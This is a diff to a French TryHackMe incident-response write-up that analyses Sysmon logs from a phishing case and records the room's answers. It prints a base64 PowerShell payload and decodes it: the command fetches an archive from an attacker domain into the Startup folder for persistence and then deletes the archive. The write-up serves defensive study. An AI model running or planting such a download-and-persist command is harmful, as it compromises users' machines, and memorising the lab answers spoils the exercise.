@@ -29,7 +29,7 @@ Pour vous aider, vous pouvez vous appuyer sur l'aide-mémoire rédigé par l'éq
 Pour l’analyse, on exporte d’abord le journal .evtx en CSV avec l'outil EvtxECmd.
 
 ![Tryhackme](00-Images/csv.png)
-
+ 
 On met un flitre sur chrome.exe et .doc
 
 ![Tryhackme](00-Images/doc.png)
@@ -50,7 +50,27 @@ réponse : benimaru-TEMPEST
 
 réponse : 496
 
+4 - D'après les journaux Sysmon, quelle est l'adresse IPv4 vers laquelle est résolu le domaine malveillant utilisé dans la question précédente ?
 
+On convertit le fichier sysmon.etvx en sysmon.xml pour pouvoir utiliser l'outil SysmonView :
 
+![Tryhackme](00-Images/dns.png)
 
+réponse : 167.71.199.191
+
+5 - Quelle est la chaîne encodée en base64 présente dans la charge utile malveillante exécutée par le document ?
+
+On utilise un filtre sur le Parent ProcessID96 et on retrouve la chaine en base64 :
+
+![Tryhackme](00-Images/base64.png)
+
+réponse : JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
+
+![Tryhackme](00-Images/base64decode.png)
+
+$app=[Environment]::GetFolderPath('ApplicationData') : récupère le chemin %APPDATA% de l’utilisateur (C:\Users\<user>\AppData\Roaming).
+cd "...\Start Menu\Programs\Startup" : se place dans le dossier Démarrage de l’utilisateur. Tout ce qui s’y trouve est lancé automatiquement à chaque ouverture de session.
+iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip : télécharge (Invoke-WebRequest) une archive depuis le domaine de l’attaquant.
+Expand-Archive .\update.zip -DestinationPath . : décompresse l’archive directement dans le dossier Démarrage.
+rm update.zip : supprime l’archive pour laisser moins de traces.
   
